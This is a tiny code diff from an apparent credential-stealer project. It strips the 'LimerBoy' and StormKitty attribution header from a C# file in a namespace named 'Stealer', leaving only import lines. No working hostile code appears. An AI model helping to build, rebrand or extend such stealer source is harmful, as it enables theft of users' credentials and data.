@@ -1,9 +1,4 @@
-﻿/* 
-    Author : LimerBoy
-    Github : github.com/LimerBoy/StormKitty
-*/
-
-using System;
+﻿using System;
 using Microsoft.Win32;
 
 namespace Stealer
